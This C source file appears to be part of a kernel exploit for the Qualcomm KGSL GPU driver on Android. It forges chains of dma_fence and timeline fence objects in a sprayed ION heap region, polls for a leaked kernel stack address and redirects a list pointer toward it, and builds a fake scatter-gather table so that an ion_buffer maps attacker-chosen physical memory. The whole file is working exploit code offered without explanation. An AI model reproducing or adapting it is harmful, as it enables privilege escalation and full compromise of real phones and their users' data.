#include "fake_obj_util.h"
#include "addr_utils.h"

static uint64_t vaddr_offset = 0;

static inline uint64_t get_vaddr(struct list_head* ptr) {
  return (uint64_t)ptr + vaddr_offset;
}

static void init_list_head(struct list_head *list)
{
	list->next = get_vaddr(list);
	list->prev = get_vaddr(list);
}

static void list_add(struct list_head *new, struct list_head *prev,
			    struct list_head * start)
{
	start->prev = get_vaddr(new);
	new->next = get_vaddr(start);
	new->prev = get_vaddr(prev);
	prev->next = get_vaddr(new);
}

static uint64_t add_zero_filled_area(void* region, size_t offset) {
  memset(region + offset, 0, ZERO_FILL_SZ);
  return ZERO_FILL_SZ + offset;
}

static struct list_head* get_list(struct kgsl_timeline_fence* fence) {
  return &fence->node;
}

static void init_fence(struct kgsl_timeline_fence* fence, uint64_t zero_fill_addr, int check) {
  struct dma_fence* base = &fence->base;
  base->flags = 0;
  base->refcount = 0;
  if (check) {
    base->cb_list.next = 0x41414141;
    base->cb_list.prev = 0x42424242;

  } else {
    init_list_head(&base->cb_list);
  }
  base->ops = zero_fill_addr;
}

static uint64_t create_fake_fences(void* region, uint64_t offset, uint64_t chain_size, uint64_t zero_fill_addr) {
  struct kgsl_timeline_fence* start = (struct kgsl_timeline_fence*)(region + offset);
  struct kgsl_timeline_fence* prev = start;
  struct list_head* start_list = get_list(start);
  struct list_head* prev_list = start_list;
  init_list_head(start_list);
  init_fence(start, zero_fill_addr, 0);
  offset += 128;
  for (uint64_t i = 1; i < chain_size; i++) {
    struct kgsl_timeline_fence* curr = (struct kgsl_timeline_fence*)(region + offset);
    struct list_head* curr_list = get_list(curr);
    init_list_head(curr_list);
    if (i == chain_size - 1) {
      init_fence(curr, zero_fill_addr, 0);
    } else {
      init_fence(curr, zero_fill_addr, 0);
    }
    list_add(curr_list, prev_list, start_list);
    prev = curr;
    prev_list = curr_list;    
    offset += 128;
  }
  return offset;
}

uint64_t fill_ion_heap(void* region, size_t chain_size, size_t region_size, uint64_t region_vaddr) {
  if (sizeof(struct kgsl_timeline_fence) > 128) err(1, "kgsl_timeline_fence too big\n");
  if (chain_size < 2) err(1, "chain size should be greater than 1.\n");
  uint64_t fake_size = chain_size * 128 + ZERO_FILL_SZ;
  if (fake_size > region_size) err(1, "chain of fake objects does not fit into region.\n");
  uint64_t offset = (region_size - fake_size)/2;
  vaddr_offset = region_vaddr - (uint64_t)region;
  uint64_t zero_fill_addr = region_vaddr + offset;
  offset = add_zero_filled_area(region, offset);
  uint64_t out = offset;
  offset = create_fake_fences(region, offset, chain_size, zero_fill_addr);
  return out;
}

uint64_t poll_list_addr(void* fence_start, size_t chain_size, uint64_t fence_kstart) {
  struct kgsl_timeline_fence* start = (struct kgsl_timeline_fence*)fence_start;
  struct kgsl_timeline_fence* curr = (struct kgsl_timeline_fence*)fence_start;
  struct dma_fence* base = &curr->base;
  base->flags = 0;
  struct list_head* cb_list = &base->cb_list;
  if (cb_list->prev > (fence_kstart + chain_size * 128)) {
    struct list_head* node = get_list(curr);
    node->next = cb_list->prev + STACK_OFFSET;
    base->refcount = 0;
    base->flags = 1;
    return cb_list->prev;
  }
  return 0;
}

void create_fake_sgtable(uint8_t* table_region, uint64_t table_vaddr, uint64_t phys_addr, size_t len) {
  struct sg_table* table = (struct sg_table*)table_region;
  table->nents = 1;
  table->orig_nents = 1;
  table->sgl = (struct scatterlist*)(table_vaddr + 128);
  struct scatterlist* sg = (struct scatterlist*)(table_region + 128);
  uint64_t page_link = phys_to_page(phys_addr);
  sg->page_link = page_link |= 0x2ul;
  sg->length = len;
  sg->offset = 0;
}

void patch_ion_buffer(struct ion_buffer* buffer, uint64_t table_vaddr, uint8_t* table_region, uint64_t phys_addr, size_t size) {
  create_fake_sgtable(table_region, table_vaddr, (phys_addr >> 12) << 12, size);
  buffer->sg_table = (struct sg_table*)table_vaddr;
  buffer->size = size;
}

